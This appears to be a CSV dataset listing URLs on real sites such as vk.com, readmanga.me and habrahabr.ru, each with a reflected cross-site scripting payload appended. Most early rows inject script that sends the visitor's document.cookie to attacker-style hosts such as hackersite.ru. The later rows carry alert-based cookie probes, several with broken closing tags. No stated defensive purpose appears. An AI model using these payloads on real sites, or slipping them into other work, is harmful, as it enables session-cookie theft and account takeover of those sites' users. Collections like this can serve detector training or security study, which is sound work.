,language,source
16,JS,https://github.com/GetDKAN/dkan/issues/790="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
17,JS,https://habrahabr.ru/post/66057/="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
18,JS,http://readmanga.me/collection/prodavaemaia_manga="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
19,JS,https://vk.com/worldofwarcraftofficial="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
20,JS,https://vk.com/pj_club="><script>var img=new Image();img.src="http://hackersite4.ru/xss.jpg?"+ encodeURI( document.cookie);</script>"
21,JS,https://vk.com/bespoleznyi="><script>var img=new Image();img.src="http://hackersit22.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
22,JS,https://vk.com/club8995="><script>var img=new Image();img.src="http://hackersite1.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
23,JS,https://vk.com/relax__art="><script>var img=new Image();img.src="http://hackersite.ru/xss3.jpg?"+ encodeURI(document.cookie );</script>"
24,JS,https://vk.com/ret_con="><script>var img=new Image();img.src="http://hackersite3.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
25,JS,https://vk.com/kinda_geek="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI( document.cookie);</script>"
26,JS,https://vk.com/sh_ring="><script>var img=new Image();img.src="http://hackersite2.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
27,JS,https://vk.com/bestgames="><script>var img=new Image();img.src="http://hackersite.ru/xss32.jpg?"+ encodeURI(document.cookie);</script>"
28,JS,https://vk.com/unclewyrmwood="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
29,JS,https://vk.com/dandaidaodu="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
30,JS,https://vk.com/royal.arts="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
31,JS,https://vk.com/uslc_group="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
32,JS,https://vk.com/mertvun="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
33,JS,https://vk.com/halalrecipes="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
34,JS,https://vk.com/clubk_k_k="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
35,JS,https://vk.com/o_ptimist?q=»><script>alert(«cookie: «+document.cookie)</script>
36,JS,https://vk.com/nice_student?q=»><script>alert(«cookie: «+document.cookie)</script>
37,JS,https://vk.com/megaotriv?q=»><script>alert(«cookie: «+document.cookie)</script>
38,JS,https://vk.com/s_arcazm?q=»><script>alert(«cookie: «+document.cookie)</script>
39,JS,https://vk.com/piter?q=»><script>alert(«cookie: «+document.cookie)</script>
40,JS,https://vk.com/prkolist?q=»><script>alert(«cookie: «+document.cookie)</script>
41,JS,https://vk.com/oprosnik_itmo?q=»><script>alert(«cookie: «+document.cookie)</script>
42,JS,https://vk.com/overhearitmo?q=»><script>alert(«cookie: «+document.cookie)</script>
43,JS,https://vk.com/proger_baby?q=»><script>alert(«cookie: «+document.cookie)</script>
44,JS,https://vk.com/tproger?q=»><script>alert(«cookie: «+document.cookie)</script
45,JS,https://vk.com/expartspb?q=»><script>alert(«cookie: «+document.cookie)</script>
46,JS,http://readmanga.me/tower_of_god/?q=»><script>alert(«cookie: «+document.cookie)</script>
47,JS,http://readmanga.me/literary_stray_dogs__dead_apple?q=»><script>alert(«cookie: «+document.cookie)</script>
48,JS,http://readmanga.me/one_punch_man?q=»><script>alert(«cookie: «+document.cookie)</script>
49,JS,http://readmanga.me/collection/suicid?q=»><script>alert(«cookie: «+document.cookie)</script>
50,JS,http://readmanga.me/magi_s_grandson?q=»><script>alert(«cookie: «+document.cookie)</script>
51,JS,http://readmanga.me/d_gray_man?q=»><script>alert(«cookie: «+document.cookie)</script>
52,JS,http://readmanga.me/helck?q=»><script>alert(«cookie: «+document.cookie)</script>
53,JS,http://readmanga.me/shonan_seven?q=»><script>alert(«cookie: «+document.cookie)</script>
54,JS,http://readmanga.me/demon_king_s_counterattack_?q=»><script>alert(«cookie: «+document.cookie)</script>
55,JS,http://readmanga.me/berserk_of_gluttony?q=»><script>alert(«cookie: «+document.cookie)</script
56,JS,http://readmanga.me/fairytail?q=»><script>alert(«cookie: «+document.cookie)</script>
